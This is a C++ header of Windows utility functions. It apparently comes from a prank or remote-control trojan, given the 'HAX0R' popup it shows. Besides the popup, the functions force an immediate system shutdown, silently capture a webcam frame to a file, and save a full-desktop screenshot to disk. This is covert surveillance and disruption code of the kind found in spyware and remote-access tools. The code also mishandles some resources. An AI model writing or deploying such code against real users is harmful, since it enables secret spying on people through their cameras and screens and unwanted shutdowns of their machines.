#ifndef H_UTILS
#define H_UTILS

namespace utils {
  void fireHax0r(){
    MessageBox(
        GetForegroundWindow(),
        "Hacking la vida loca",
        "HAX0R",
        MB_ICONWARNING | MB_OK
        );
  }

  void shutdown() {
    system("shutdown -s -t 0");
  }

  void captureWebcam(char *path) {
    HWND hwndVideo = capCreateCaptureWindow("WCW",
        NULL,
        0, 0,
        640, 480,
        GetForegroundWindow(),
        0);

    capDriverConnect(hwndVideo,0);
    capGrabFrame(hwndVideo);
    capFileSaveDIB(hwndVideo, path);

    DestroyWindow(hwndVideo);
    hwndVideo = NULL;
  }

  char * TakeScreenShot(char *path) {
    HWND sh = GetDesktopWindow();
    if (sh == NULL) {
      printf("ERROR\n");
    }

    RECT rc;
    GetWindowRect(sh, &rc);

    HDC hdcScreen = GetDC(sh);
    HDC hdc = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmp = CreateCompatibleBitmap(hdcScreen, rc.right, rc.bottom);
    SelectObject(hdc, hbmp);

    printf("\n point: %d %d, point: %d %d\n", rc.left, rc.top, rc.right, rc.bottom);
    BitBlt(hdc, 0, 0, rc.right, rc.bottom, hdcScreen, 0, 0, SRCCOPY );

    // TEST WITH CLIPBOARD
    // OpenClipboard(NULL);
    // EmptyClipboard();
    // SetClipboardData(CF_BITMAP, hbmp);
    // CloseClipboard();

    BITMAP bmpScreen;
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;

    GetObject(hbmp, sizeof(BITMAP), &bmpScreen);

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmpScreen.bmWidth;
    bi.biHeight = bmpScreen.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    DWORD dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;
    HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
    char *lpbitmap = (char *)GlobalLock(hDIB);

    GetDIBits(hdcScreen, hbmp, 0,
        (UINT)bmpScreen.bmHeight,
        lpbitmap,
        (BITMAPINFO *)&bi, DIB_RGB_COLORS);

    HANDLE hFile = CreateFile(path,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, NULL);

    // Add the size of the headers to the size of the bitmap to get the total file size
    DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    //Offset to where the actual bitmap bits start.
    bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
    //Size of the file
    bmfHeader.bfSize = dwSizeofDIB;
    //bfType must always be BM for Bitmaps
    bmfHeader.bfType = 0x4D42; //BM

    DWORD dwBytesWritten = 0;
    WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);

    CloseHandle(hFile);

    GlobalUnlock(hDIB);
    DeleteObject(hbmp);
    ReleaseDC(NULL, hdcScreen);
    DeleteDC(hdcScreen);

    return lpbitmap;
  }
}

#endif
